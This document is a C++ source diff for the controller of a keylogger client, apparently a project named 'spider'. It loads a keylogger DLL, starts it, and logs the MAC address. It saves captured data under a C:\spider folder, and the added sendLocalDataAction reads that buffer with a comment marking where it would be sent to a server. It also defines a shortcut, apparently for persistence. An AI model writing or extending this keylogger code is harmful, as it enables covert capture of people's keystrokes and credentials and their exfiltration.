@@ -3,7 +3,6 @@
 #include "sayHello.h"
 #include "IInfoClient.h"
 
-
 /////////////////////////////////////////////////////////////////
 //  SETTINGS
 /////////////////////////////////////////////////////////////////
@@ -11,35 +10,53 @@
 clientController::clientController(void) throw(DLibraryException)
 {
 
-	//////////////////////////////
-	// Load libraries
-	//////////////////////////////
+	//////////////////////////////////////////////////////
+	// Specify libraries PATH
+	//////////////////////////////////////////////////////
 
 	#ifdef __linux__
-		this->libraries.add(1, "sayHello", "./libsayHello.so");
+		this->libraries.add(1, "dataHandler", "./libdataHandler.so");
 	#elif _WIN32
 		this->libraries.add(1, "sayHello", "sayHello.dll");
 		this->libraries.add(2, "infoClient", "InfoClient.dll");
-		this->libraries.add(2, "keylogger_dll", "keylogger_dll.dll");
+		this->libraries.add(3, "keylogger_dll", "keylogger_dll.dll");
+		this->libraries.add(4, "dataHandler", "dataHandler.dll");
+
+		this->bytePerFile = 4;
+		this->storeFolder = "C:\\\\spider\\";
 	#endif
 
-	if (!(this->libraries.handler.loadByName("sayHello")))
-		throw DLibraryException("sayHello", "Couldn't load module.");
+
+	//////////////////////////////////////////////////////
+	// Load Libraries
+	//////////////////////////////////////////////////////
+
+	std::string		err;
+
+	if (!(this->libraries.handler.loadAll(err)))
+		throw DLibraryException(err.c_str(), "Couldn't load module.");
+
+
+	//////////////////////////////////////////////////////
+	// Get dictionaries and instanciate tools
+	//////////////////////////////////////////////////////
+
 	if (!(this->sayHello = this->libraries.handler.getDictionaryByName("sayHello")))
 		throw DLibraryException("sayHello", "Couldn't get Dictionary.");
+
 	#ifdef _WIN32
-	if (!(this->libraries.handler.loadByName("infoClient")))
-		throw DLibraryException("infoClient", "Couldn't load module.");
 	if (!(this->infoClient = this->libraries.handler.getDictionaryByName("infoClient")))
 		throw DLibraryException("infoClient", "Couldn't get ClassInstance");
 	this->ifinstance = ((_getInstance)(*this->infoClient)["getInstance"])();
 
-	if (!(this->libraries.handler.loadByName("keylogger_dll")))
-		throw DLibraryException("keylogger_dll", "Couldn't load module.");
 	if (!(this->keylogger_dll = this->libraries.handler.getDictionaryByName("keylogger_dll")))
 		throw DLibraryException("keylogger_dll", "Couldn't get Dictionary.");
 	this->klinstance = ((_instantiate)(*this->keylogger_dll)["instantiate"])(std::ref(this->_lwqueue));
 	#endif
+
+	if (!(this->dictDataHandler = this->libraries.handler.getDictionaryByName("dataHandler")))
+		throw DLibraryException("dataHandler", "Couldn't get Dictionary.");
+	this->dataHandler = ((_getDataHandler)(*this->dictDataHandler)["getDataHandler"])();
 }
 
 clientController::~clientController(void)
@@ -48,16 +65,22 @@ clientController::~clientController(void)
 }
 
 /////////////////////////////////////////////////////////////////
-//  SCENARIO
+//  SCENARIO ( ACTIONS )
 /////////////////////////////////////////////////////////////////
 
-int		clientController::mainAction(int ac, char **av) {
+int		clientController::mainAction(int ac, char **av)
+{
 
-	// Dire bonjour
-	this->sayHelloAction();
+	// Try to get what was written before
+	this->dataHandler->fileHandler->initStream(this->storeFolder, this->bytePerFile);
+	// this->dataHandler->fileHandler->insertDataToStream("This is one data");
+	// this->dataHandler->fileHandler->insertDataToStream("This is another data");
+	// this->sendLocalDataAction();
+
 	this->defineShortcut();
 	this->klinstance->init();
 	std::cout << this->ifinstance->getMacAddr() << std::endl;
+
 	// Faire pleins de trucs :
 	// this->dhinstance->init();
 
@@ -74,14 +97,25 @@ int		clientController::mainAction(int ac, char **av) {
 	
 	// keylogger_test
 
+	system("pause");
+
 	return (0);
 }
 
-void					clientController::sayHelloAction(void) {
+bool			clientController::sendLocalDataAction(void)
+{
+	std::string	buffer;
 
-	((_sayHelloFrom)(*this->sayHello)["sayHelloFrom"])("client");
+	buffer = this->dataHandler->fileHandler->extractDataFromStream(10);
+	while (buffer.size())
+	{
+		// Here we can send buffer to server
+		std::cout << "[BUFFER] : " << buffer << std::endl;
+		this->dataHandler->fileHandler->removeLocalData(10);
+		buffer = this->dataHandler->fileHandler->extractDataFromStream(10);
+	}
+	return (true);
 }
-
 
 void	clientController::defineShortcut(void) {
 	LPCSTR module = new char[MAX_PATH];
